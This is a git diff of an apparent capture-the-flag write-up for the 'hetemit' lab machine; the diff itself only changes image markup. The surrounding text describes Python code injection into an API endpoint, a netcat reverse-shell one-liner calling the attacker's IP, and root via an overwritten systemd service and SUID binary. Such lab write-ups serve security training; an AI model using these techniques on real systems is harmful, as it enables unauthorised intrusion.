@@ -27,13 +27,13 @@ Lots of ports. FTP allows for anonymous access, but just hangs.
 
 Port 80 had the default Apache HTTP Server:
 
-<figure><img src="../../../.gitbook/assets/image (1177).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1177).png>)
 
 Ran a directory scan on this and didn't find much.
 
 Port 50000 had a simple API running:
 
-<figure><img src="../../../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(181).png>)
 
 If we use the `/generate` option, it just returns us this:
 
@@ -44,19 +44,19 @@ $ curl http://192.168.201.117:50000/generate
 
 I tried sending POST requests to this:
 
-<figure><img src="../../../.gitbook/assets/image (983).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(983).png>)
 
 Not too sure what to do with that token. However, we notice that this is running a Python server. The `/verify` endpoint also accepts POST requests, but it always seems to fail:
 
-<figure><img src="../../../.gitbook/assets/image (3207).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3207).png>)
 
 Since this was running a Python based server, we can try some Python code injection.
 
-<figure><img src="../../../.gitbook/assets/image (3557).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3557).png>)
 
 This looks like it works. Another test confirms that it works:
 
-<figure><img src="../../../.gitbook/assets/image (759).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(759).png>)
 
 So this script has the `os` module imported, meaning we can get an easy reverse shell:
 
@@ -64,7 +64,7 @@ So this script has the `os` module imported, meaning we can get an easy reverse 
 os.system("nc -e /bin/bash 192.168.45.191 21")
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3136).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3136).png>)
 
 ## Privilege Escalation
 
@@ -89,7 +89,7 @@ User cmeeks may run the following commands on hetemit:
 
 This indicates to me that there is some kind of startup script to exploit. I ran a `linpeas.sh` scan on the machine to enumerate, and it found quite a few misconfigured services:
 
-<figure><img src="../../../.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1224).png>)
 
 We can overwrite this to execute a script that gives us a reverse shell. I included the SUID bit in my script just in case the shell doesn't work:
 
@@ -131,6 +131,6 @@ WantedBy=multi-user.target
 
 Then, we can run `sudo /sbin/reboot` to restart the machine. Then we just have to wait for a bit before we can SSH back in. The reverse shell didn't work for some reason, but the SUID binary command did:
 
-<figure><img src="../../../.gitbook/assets/image (1231).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1231).png>)
 
 Rooted!
